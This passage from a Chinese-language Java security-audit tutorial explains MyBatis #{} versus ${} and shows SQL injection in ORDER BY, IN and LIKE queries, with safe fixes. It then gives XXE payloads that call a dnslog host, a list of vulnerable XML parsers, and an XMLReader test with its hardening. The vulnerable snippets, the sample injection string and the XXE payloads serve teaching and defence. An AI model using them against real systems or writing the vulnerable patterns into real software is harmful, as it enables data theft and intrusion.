<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;STDOUT_LOGGING&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">&quot;com/example/mapper/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Mapper 接口 <code>UserMapper.java</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    User <span class="title function_">getUserById</span><span class="params">(<span class="type">int</span> id)</span>;</span><br><span class="line">    List&lt;User&gt; <span class="title function_">getAllUsers</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Mapper XML 文件 <code>UserMapper.xml</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.example.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.model.User&quot;</span>&gt;</span></span><br><span class="line">        SELECT id, name, email FROM users WHEREid=#&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getAllUsers&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.model.User&quot;</span>&gt;</span></span><br><span class="line">        SELECT id, name, email FROM users</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Java 主程序 <code>Main.java</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;</span><br><span class="line"></span><br><span class="line">publicclassMain&#123;</span><br><span class="line">    publicstaticvoidmain(String[] args)&#123;</span><br><span class="line">        SqlSessionFactorysqlSessionFactory= newSqlSessionFactoryBuilder().build(Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>));</span><br><span class="line">        <span class="keyword">try</span>(SqlSessionsession= sqlSessionFactory.openSession())&#123;</span><br><span class="line">            UserMapperuserMapper= session.getMapper(UserMapper.class);</span><br><span class="line">            Useruser= userMapper.getUserById(<span class="number">1</span>);</span><br><span class="line">            System.out.println(user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="MyBatis中-和-区别"><code>MyBatis</code>中#{}和${}区别</h4>
<p>在<code>Mybatis</code>中拼接<code>SQL</code>语句有两种方式：一种是占位符 <code>#&#123;&#125;</code> ，另一种是拼接符<code>$&#123;&#125;</code> 。</p>
<h5 id="对于-：">对于<code>#&#123;&#125;</code>：</h5>
<p><code>#&#123;&#125;</code> 占位符用于<strong>预编译参数绑定</strong>，<code>MyBatis</code>会把 <code>#&#123;&#125;</code> 中的值<strong>作为参数</strong>传递给数据库查询或更新语句，在执行 <code>SQL</code>时由数据库驱动进行处理。这样做的好处是，<strong>参数会被视为数据，进行转义和预编译</strong>，不会直接拼接到<code>SQL</code>语句中，防止了<code>SQL</code>注入攻击。</p>
<ul>
<li><strong>使用场景：</strong> <code>#&#123;&#125;</code> 适用于所有情况，尤其是对于动态条件、查询参数等。比如查询条件、更新值等。</li>
</ul>
<p>示例：</p>
<p>查询的<code>xml</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM users WHERE id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>对应的<code>Java</code>代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userMapper.getUserById(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>哪么最后在执行时，<code>MyBatis</code> 会将 <code>id</code> 的值 1 绑定到 <code>SQL</code> 查询中，生成的<code>SQL</code>语句会是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> ?</span><br></pre></td></tr></table></figure>
<p>如果传入的数值为1，那么最终会被解析成</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> &quot;1&quot;</span><br></pre></td></tr></table></figure>
<h5 id="对于">对于<code>$&#123;&#125;</code>:</h5>
<p><code>$&#123;&#125;</code> 用于<strong>直接拼接字符串</strong>。<code>MyBatis</code> 在解析 <code>SQL</code> 时，<code>$&#123;&#125;</code> 不会对传入的参数不做处理，而是直接拼接，<code>MyBatis</code>会把 <code>$&#123;&#125;</code> 中的内容直接替换为对应的参数值，而<strong>不进行任何转义或预处理</strong>，进而会造成<code>SQL</code>注入漏洞。</p>
<ul>
<li><strong>使用场景</strong>：<code>$&#123;&#125;</code> 一般用于动态表名、列名、排序字段等场景，通常情况下不应将用户输入的参数直接传入 <code>$&#123;&#125;</code> 中，以防止<code>SQL</code>注入。</li>
</ul>
<h4 id="存在SQL注入漏洞的">存在<code>SQL</code>注入漏洞的<code>$&#123;&#125;</code></h4>
<p>假设我们允许用户通过输入标名查询数据，并且直接用<code>$&#123;&#125;</code>来拼接<code>SQL</code>：</p>
<p><code>Mapper XML</code>文件：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findByTable&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM $&#123;tableName&#125; WHERE id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的<code>tableName</code>为<code>SQL</code>语句的一部分，直接拼接可导致<code>SQL</code>注入问题。假设注入的数据为<code>users;select database();-- -</code>，查询数据库的名称。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users;<span class="keyword">select</span> database();<span class="comment">-- -where id = ?</span></span><br></pre></td></tr></table></figure>
<p><strong>不存在<code>SQL</code>注入的<code>$&#123;&#125;</code>用法</strong></p>
<p><code>Mapper XML</code>文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findByColumn&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM users WHERE $&#123;column&#125; = #&#123;value&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>对应的<code>Java</code>代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">column</span> <span class="operator">=</span> <span class="string">&quot;age&quot;</span>; <span class="comment">//用户不可控</span></span><br><span class="line"><span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> <span class="number">25</span>; <span class="comment">//用户可控</span></span><br><span class="line">List&lt;User&gt; users = userMapper.findByColumn(column, value);</span><br></pre></td></tr></table></figure>
<p>最后在执行时，<code>MyBatis</code> 会将 <code>$&#123;column&#125;</code> 替换成 <code>age</code>，而 <code>#&#123;value&#125;</code> 仍然会用 <code>25</code> 作为参数绑定。最终生成的 SQL 语句为：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> age <span class="operator">=</span> ?</span><br></pre></td></tr></table></figure>
<p>总之，防止<code>SQL</code>注入的关键点是，作为<code>SQL</code>语句中的**字段部分(为SQL语句的一部分,不使用预编译)**不是用户可以任意控制的，这样就可以有效的防止<code>SQL</code>注入了。例如，上述的案例中<code>age</code>是写死的或者写一个白名单数组，只允许传入白名单数组内的内容，这样用户不可任意控制了也就防止了<code>SQL</code>注入。</p>
<h3 id="ORDER-BY注入"><code>ORDER BY</code>注入</h3>
<p><code>ORDER BY</code>语句 ：用于对查询结果的排序，<code>asc</code>为升序，<code>desc</code>为降序。默认为升序。</p>
<p>比如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> username <span class="keyword">asc</span>;</span><br></pre></td></tr></table></figure>
<p><code>JDBC</code>中的<code>ORDER BY</code>注入问题，前面已经说过了。</p>
<p>与<code>JDBC</code>预编译中<code>ORDER BY</code>注入一样，在<code>ORDER BY</code>语句后面需要是字段名或者字段位置。因此也不能使用<code>Mybatis</code>中预编译的方式。</p>
<p>存在注入的<code>ORDER BY</code>查询，如下<code>UserMapper.xml</code>，这里的<code>sort</code>要可控为任意字符。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;orderbysqli&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">  select * from users order by $&#123;sort&#125; asc </span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>Java</code>代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/mybatis/orderby&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">orderbySql</span><span class="params">(<span class="meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> userMapper.orderbysqli(sort);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="IN注入"><code>IN</code>注入</h3>
<p><code>IN</code>语句：常用于<code>where</code>表达式中，其作用是查询某个范围内的数据。</p>
<p>比如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">where</span> field <span class="keyword">in</span> (value1,value2,value3,…); </span><br></pre></td></tr></table></figure>
<p>如上所示，<code>IN</code>在查询某个范围数据是会用到多个参数，在<code>Mybtis</code>中如果直接使用占位符 <code>#&#123;&#125;</code>进行查询会将这些参数看做一个整体，<strong>查询会报错</strong>。 因此很多开发人员可能会使用拼接符<code>$&#123;&#125;</code>对参数进行查询，从而造成了SQL注入漏洞。</p>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">in</span> ($&#123;params&#125;) </span><br></pre></td></tr></table></figure>
<p>正确的做法是需要使用<code>foreach</code>配合占位符 <code>#&#123;&#125;</code> 实现<code>IN</code>查询。比如：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- where in 查询场景 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findUsers&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM users WHERE id IN </span><br><span class="line">    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">item</span>=<span class="string">&quot;id&quot;</span> <span class="attr">collection</span>=<span class="string">&quot;ids&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span></span><br><span class="line">        #&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>存在<code>SQL</code>注入漏洞的代码。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findUsers&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM users WHERE id IN ($&#123;ids&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>对应的<code>Java</code>代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/mybatis/injection&quot;)</span></span><br><span class="line">publicList&lt;User&gt;INuser(<span class="meta">@RequestParam(&quot;id&quot;)</span> String id)&#123;</span><br><span class="line">  <span class="keyword">return</span> userMapper.INuser(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="LIKE注入"><code>LIKE</code>注入</h3>
<p><code>LIKE</code> 子句用于在<code> SQL</code> 查询中进行模糊匹配。当使用用户输入的内容作为 <code>LIKE</code> 条件时，应该非常小心，因为恶意输入可能导致<code>SQL</code>注入。使用<code>LIKE</code>语句进行查询时如果使用占位符<code>#&#123;&#125;</code>查询时程序会报错。</p>
<p>因此经验不足的开发人员可能会直接使用拼接符 <code>$&#123;&#125; </code>对参数进行查询，从而造成了SQL注入漏洞。</p>
<p>这里<code>username</code>任意可控，存在<code>SQL</code>注入的代码。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;like2&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">        select * from users where username like &#x27;%$&#123;username&#125;%&#x27;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>正确的用法，不存在<code>SQL</code>注入漏洞。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserListLikeConcat&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;org.example.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM user WHERE name LIKE concat (&#x27;%&#x27;, #&#123;name&#125;, &#x27;%&#x27;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserListLike&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;org.example.User&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bind</span> <span class="attr">name</span>=<span class="string">&quot;pattern&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#x27;%&#x27; + name + &#x27;%&#x27;&quot;</span> /&gt;</span></span><br><span class="line">  SELECT * FROM user </span><br><span class="line">  WHERE name LIKE #&#123;pattern&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="SQL相关函数点"><code>SQL</code>相关函数点</h3>
<p>看了前面的内容，我们可以知道，代码存在<code>SQL</code>注入，其实本质就是将用户的输入当作了<code>SQL</code>语句的字段内容去执行了。想要发现<code>SQL</code>注入漏洞，就要注意在代码中进行<code>SQL</code>语句操作的位置点，仔细查看代码是否正常使用预编译或者是否过滤完全。</p>
<p>下面给出了涉及<code>SQL</code>语句操作的词语，通过这些词可以快速定位代码中的操作<code>SQL</code>的内容。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Statement</span><br><span class="line">createStatement</span><br><span class="line">PrepareStatement</span><br><span class="line">like <span class="string">&#x27;%$&#123;</span></span><br><span class="line"><span class="string">in($&#123;</span></span><br><span class="line"><span class="string">in ($&#123;</span></span><br><span class="line"><span class="string">select</span></span><br><span class="line"><span class="string">update</span></span><br><span class="line"><span class="string">insert</span></span><br><span class="line"><span class="string">delete</span></span><br><span class="line"><span class="string">$&#123;</span></span><br><span class="line"><span class="string">setObject(</span></span><br><span class="line"><span class="string">setInt(</span></span><br><span class="line"><span class="string">setString(</span></span><br><span class="line"><span class="string">setSQLXML(</span></span><br><span class="line"><span class="string">createQuery(</span></span><br><span class="line"><span class="string">createSQLQuery(</span></span><br><span class="line"><span class="string">createNativeQuery(</span></span><br></pre></td></tr></table></figure>
<h2 id="XXE">XXE</h2>
<p>常见的<code>XXE</code>的<code>payload</code>如下：</p>
<p>测试回显的<code>XXE</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE x [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://dnslog.com/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>无回显<code>XXE</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://dnslog.com&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="漏洞相关库">漏洞相关库</h3>
<p>常见的可能存在<code>XXE</code>的相关包<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.parsers.SAXParserFactory</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br></pre></td></tr></table></figure>
<h3 id="测试实例">测试实例</h3>
<h4 id="org-xml-sax-XMLReader">org.xml.sax.XMLReader</h4>
<p>存在<code>XXE</code>漏洞的情况。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.x2n.vultest;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.XMLReader;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.XMLReaderFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XMLReaderXXE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建XMLReader实例</span></span><br><span class="line">            <span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">            <span class="comment">// 构建一个包含XXE漏洞的XML字符串</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM \&quot;http://dnslog.cn\&quot;&gt; ]&gt;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;x&gt;&amp;xxe;&lt;/x&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">// 使用InputSource包装XML字符串</span></span><br><span class="line">            <span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>();</span><br><span class="line">            inputSource.setCharacterStream(<span class="keyword">new</span> <span class="title class_">java</span>.io.StringReader(xml));</span><br><span class="line">            <span class="comment">// 解析XML</span></span><br><span class="line">            xmlReader.parse(inputSource);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不存在<code>XXE</code>漏洞，参考前辈文章<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建XMLReader实例</span></span><br><span class="line"><span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line"><span class="comment">//在xmlReader后进行setFeature</span></span><br><span class="line"><span class="comment">//第一个是关键的setFeature</span></span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="comment">// 构建一个包含XXE漏洞的XML字符串</span></span><br><span class="line"><span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM \&quot;http://dnslog.cn\&quot;&gt; ]&gt;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&lt;x&gt;&amp;xxe;&lt;/x&gt;&quot;</span>;</span><br><span class="line"><span 